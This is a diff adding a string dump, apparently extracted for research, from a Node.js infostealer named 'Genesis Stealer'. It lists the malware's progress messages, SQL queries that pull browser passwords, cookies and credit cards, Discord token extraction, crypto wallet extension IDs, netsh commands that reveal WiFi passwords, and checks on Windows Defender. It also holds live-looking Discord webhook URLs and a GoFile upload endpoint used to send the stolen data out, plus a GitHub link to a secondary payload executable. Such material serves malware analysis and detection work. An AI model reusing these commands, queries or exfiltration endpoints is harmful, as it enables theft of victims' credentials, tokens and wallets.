@@ -1,0 +1,409 @@
+\t
+\n[1/7] Terminating browser processes...
+\n[2/7] Preparing temporary directory...
+\n[3/7] Collecting data...
+\n[4/7] Creating archive...
+\n[5/7] Sending system information...
+\n[6/7] Sending data summary...
+\n[7/7] Uploading data archive...
+\n[BONUS] Downloading secondary payload...
+\nCleaning up...
+\n═══════════════════════════════════════════════════════════
+  - ${gpu.name} (${gpu.vram})
+\n
+ /F /F /IM 
+ GB
+ K
+"${payloadPath}"
+#
+# Netscape HTTP Cookie File
+# This is a generated file! Do not edit.
+\n
+${STRINGS.GENESIS_SOCIETY} | ${STRINGS.GENESIS_KEY}
+${cookie.domain}\tTRUE\t${cookie.path}\t${cookie.secure ? 'TRUE' : 'FALSE'}\t${cookie.expires}\t${cookie.name}\t${cookie.value}
+\n
+${days}d ${hours}h ${minutes}m
+${stats.cookies || 0} cookies extracted
+${stats.minecraft || 0} Minecraft\n${stats.lunar || 0} LunarClient
+${stats.passwords || 0} passwords extracted
+${stats.tokens || 0} tokens found
+${stats.wallets || 0} wallets detected
+${stats.wifi || 0} networks
+%
+**CPU:** ${systemInfo.cpu.model}\n**Cores:** ${systemInfo.cpu.cores}\n**RAM:** ${systemInfo.ram.total} (${systemInfo.ram.usagePercent} used)
+**Hostname:** ${systemInfo.hostname}\n**Username:** ${systemInfo.username}\n**OS:** ${systemInfo.version}\n**Uptime:** ${systemInfo.uptime}
+**IP:** ${ipInfo.ip}\n**Country:** ${ipInfo.country}\n**City:** ${ipInfo.city}\n**ISP:** ${ipInfo.isp}
+,
+--disable-dev-shm-usage
+--disable-gpu
+--headless
+--no-sandbox
+--remote-debugging-port=
+--remote-debugging-port=${debugPort}
+--user-data-dir=
+--user-data-dir=${userDataPath}
+.json
+.ldb
+.log
+.lunarclient
+.minecraft
+.txt
+.zip
+7Star Browser
+7Star\\7Star\\User Data
+7star
+7star.exe
+@GenesisSociety
+APPDATA
+All Users
+Antivirus Enabled: ${defenderStatus.antivirusEnabled}\nReal-Time Protection: ${defenderStatus.realTimeProtection}\nBehavior Monitoring: ${defenderStatus.behaviorMonitoring}\n\n
+AppData
+Archive created:
+Atomic
+Atomic Wallet
+Authorization
+Bookmarks
+Brave Browser
+BraveSoftware\\Brave-Browser\\User Data
+Browser termination complete
+C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe
+C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe
+C:\\Users
+CPU: ${systemInfo.cpu.model} (${systemInfo.cpu.cores} cores @ ${systemInfo.cpu.speed} MHz)\n
+CentBrowser
+CentBrowser\\User Data
+Chromium
+Chromium\\User Data
+Coinomi
+Content-Type
+Cookies
+Creating data archive...
+Data collection complete!
+Decipher
+Default
+Default User
+Discord
+Discord webhook sent successfully
+Downloaded
+Downloading secondary payload...
+Electrum
+Electrum\\wallets
+Epic Privacy Browser
+Epic Privacy Browser\\User Data
+Error
+Error checking process ${processName}:
+Error copying directory ${source}:
+Error creating archive:
+Error downloading payload:
+Error during stealer execution:
+Error executing payload:
+Error extracting Discord tokens:
+Error extracting Firefox cookies:
+Error extracting LunarClient data:
+Error extracting Minecraft data:
+Error extracting Opera GX cookies:
+Error extracting WiFi passwords:
+Error extracting autofill:
+Error extracting cookies:
+Error extracting passwords:
+Error getting IP info:
+Error getting cookies from headless browser:
+Error getting installed software:
+Error getting processes:
+Error launching headless browser:
+Error reading Firefox cookies:
+Error reading cookies:
+Error reading passwords:
+Error reading user directories:
+Error sending Discord webhook:
+Error sending file to Discord:
+Error uploading to GoFile:
+Error writing file ${filePath}:
+Ethereum
+Ethereum Wallet
+Ethereum\\wallets
+Executing payload...
+Execution has been DISABLED for safety.
+Exodus
+Exodus Desktop
+Extension
+Extension Settings
+Extracting Discord tokens...
+Extracting browser data...
+Extracting cryptocurrency wallets...
+Extracting gaming data...
+FALSE
+Failed
+Failed to get GoFile server
+Failed to kill ${processName}
+File sent to Discord successfully
+Found
+GPU:\n
+Gathering system information...
+Genesis
+Genesis (Minecraft)
+Genesis Stealer - Operation Complete
+Genesis Stealer - Starting Operation
+Get-MpComputerStatus
+Getting GoFile server...
+GoFile upload failed
+Google Chrome
+Google\\Chrome\\User Data
+History
+Hostname: ${systemInfo.hostname}\nUsername: ${systemInfo.username}\nPlatform: ${systemInfo.platform}\nArchitecture: ${systemInfo.arch}\nWindows Version: ${systemInfo.version}\nUptime: ${systemInfo.uptime}\n\n
+IP Address: ${ipInfo.ip}\nCountry: ${ipInfo.country}\nRegion: ${ipInfo.region}\nCity: ${ipInfo.city}\nISP: ${ipInfo.isp}\nTimezone: ${ipInfo.timezone}\n\n
+IPv4
+Iridium
+Iridium\\User Data
+Jaxx Liberty
+KEY: dQw4w9WgXcQ
+Kometa
+Kometa\\User Data
+LOCALAPPDATA
+Local
+Local Extension Settings
+Local State
+Local Storage
+Login Data
+LunarClient
+MetaMask
+Metamask
+Microsoft Edge
+Microsoft\\Edge\\User Data
+Minecraft
+Mozilla Firefox
+Mozilla\\Firefox\\Profiles
+Network
+Opera
+Opera GX
+Opera Software\\Opera GX Stable
+Opera Software\\Opera Stable
+Orbitum
+Orbitum\\User Data
+Payload downloaded:
+Payload executed successfully
+Preferences
+Profile 1
+Profile 2
+Profile 3
+Profile 4
+Public
+RAM: ${systemInfo.ram.total} (${systemInfo.ram.used} used, ${systemInfo.ram.usagePercent})\n
+Roaming
+SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies
+SELECT host_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies
+SELECT name, value FROM autofill
+SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards
+SELECT origin_url, username_value, password_value FROM logins
+SSID: ${wifi.ssid}\nPassword: ${wifi.password}\n───────────────────────────────────────────────────────────\n
+Sputnik
+Sputnik\\User Data
+Starting data collection...
+Successfully
+Successfully killed ${processName}
+SystemDrive
+TEMP
+TRUE
+Telegram
+Terminating browser processes...
+This is a deobfuscated malware file for research purposes.
+To analyze behavior in a VM, uncomment the execution line above.
+Token ${index + 1}: ${token}\n
+URL: ${pass.url}\nUsername: ${pass.username}\nPassword: ${pass.password}\n───────────────────────────────────────────────────────────\n
+USERPROFILE
+Unknown
+Uploaded
+Uploading file to GoFile...
+Uran
+Using server: ${server}
+V139_cookies.exe
+Vivaldi
+Vivaldi\\User Data
+WEBHOOK_URL_PLACEHOLDER
+Warning
+Web Data
+Windows Defender
+Yandex Browser
+Yandex\\YandexBrowser\\User Data
+\\BraveSoftware\\Brave-Browser\\User Data
+\\Chromium\\User Data
+\\Google\\Chrome\\User Data
+\\Microsoft\\Edge\\User Data
+\\Profile 
+\\Vivaldi\\User Data
+\\Yandex\\YandexBrowser\\User Data
+\\discord\\Local Storage\\leveldb
+_cookies.txt
+_genesis_
+_passwords.txt
+_systeminfo.txt
+_tokens.txt
+_wallets.txt
+abcdefghijklmnopqrstuvwxyz0123456789
+accounts.json
+adm-zip
+aes-256-gcm
+aholpfdialjgjfhomihkjbmgjidlcdno
+application/json
+arch
+arraybuffer
+author
+autofill
+axios
+base64
+blbpgcogcoohhngdjafgpoagcilicpjh
+brave.exe
+browser-extension
+centbrowser
+centbrowser.exe
+child_process
+chrome
+chrome.exe
+chromium
+chromium.exe
+cjelfplplebdjjenllpjcblmjkfcffne
+color
+content
+cookies.sqlite
+cookies.txt
+cookies_${Date.now()}.db
+copyFileSync
+cpu
+createDecipheriv
+credit_card
+crypto
+dQw4w9WgXcQ
+description
+desktop
+discord_tokens.txt
+discordcanary
+discorddevelopment
+discordptb
+edge
+embeds
+env
+epicprivacybrowser.exe
+execSync
+existsSync
+ff_cookies_${Date.now()}.db
+fhilaheimglignddkjgofkcbgekhenbh
+fields
+file
+final
+firefox
+firefox.exe
+footer
+form-data
+fs
+game
+genesis_${Date.now()}.zip
+get
+headers
+hieplnfojfccegoloniefimmbfjdgcgp
+homedir
+hostname
+http://
+http://127.0.0.1:${debugPort}/json
+http://ip-api.com/json/
+https://
+https://${server}.gofile.io/uploadFile
+https://api.gofile.io/getServer
+https://discord.com/api/v9/users/@me
+https://discord.com/api/webhooks/1432055166512664718/LyKdCLjcduWDfErvxvS8xra8sdNekGQwmJLqErtzyfT9L-88dNHYfxzHy9bjPv6AcZzg
+https://discord.com/api/webhooks/1436355187974344857/RzxMo9ZQMmVkKpylVUn1Hx4_ISLWWGa6CcD9zs00hun3VbC7KhA0HaxiYOqipU_BmRIp
+https://github.com/Azyyyyyyyyyyyyyy/UEUUUUUAj/releases/download/V139/V139_cookies.exe
+https://i.imgur.com/SRCw5fO.png
+https://{server}.gofile.io/uploadFile
+ignore
+iridium
+iridium.exe
+killed
+kometa
+kometa.exe
+launcher_profiles.json
+leveldb
+logindata_${Date.now()}.db
+lunarclient
+memory
+minecraft
+mkdirSync
+msedge.exe
+netsh wlan show profile name="${profileName}" key=clear
+netsh wlan show profile name="{PROFILE}" key=clear
+netsh wlan show profiles
+nkbihfbeogaeaoehlefnkodbefgpgknn
+null
+ok
+opera.exe
+orbitum
+orbitum.exe
+os
+passwords.txt
+path
+platform
+post
+powershell "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher | ConvertTo-Json"
+powershell "Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled | ConvertTo-Json"
+powershell "Get-WmiObject Win32_VideoController | Select-Object Name, AdapterRAM | ConvertTo-Json"
+readFileSync
+readdirSync
+recursive
+rmSync
+setAuthTag
+settings
+settings.json
+sputnik
+sputnik.exe
+sqlite3
+statSync
+system_info.txt
+taskkill
+taskkill /F /IM ${processName} /T
+tasklist
+tasklist /FO CSV /NH
+tdata
+thumbnail
+title
+tmpdir
+uCozMedia\\Uran\\User Data
+undefined
+unlinkSync
+update
+uran
+uran.exe
+username
+utf-8
+utf8
+v10
+v11
+ver
+vivaldi.exe
+wallets
+webdata_${Date.now()}.db
+writeFileSync
+yandex.exe
+═══════════════════════════════════════════════════════════
+═══════════════════════════════════════════════════════════\nDISCORD TOKENS\n═══════════════════════════════════════════════════════════\n\n
+═══════════════════════════════════════════════════════════\nEXTRACTED PASSWORDS\n═══════════════════════════════════════════════════════════\n\n
+═══════════════════════════════════════════════════════════\nSYSTEM INFORMATION\n═══════════════════════════════════════════════════════════\n\n
+⚙️ Hardware
+⚠️  MALWARE CODE LOADED BUT NOT EXECUTED
+⚠️ **Genesis - Error**\n\`\`\`${error.message}\`\`\`
+✅ File uploaded successfully:
+🌐 Location
+🌐 NETWORK & LOCATION\n
+🍪 Cookies
+🎮 Gaming
+🎯 **Genesis - Data Archive**
+🎯 **Genesis - Data Archive**\n\n✅ Uploaded to GoFile\n📥 Download: ${downloadUrl}
+🎯 Genesis - Data Collection Summary
+💬 Discord
+💰 Wallets
+💻 Computer
+💻 HARDWARE\n
+📶 WIFI NETWORKS\n
+📶 WiFi
+🔑 Passwords
+🖥️  COMPUTER INFO\n
+🖥️ Genesis - System Information
+🛡️  WINDOWS DEFENDER\n
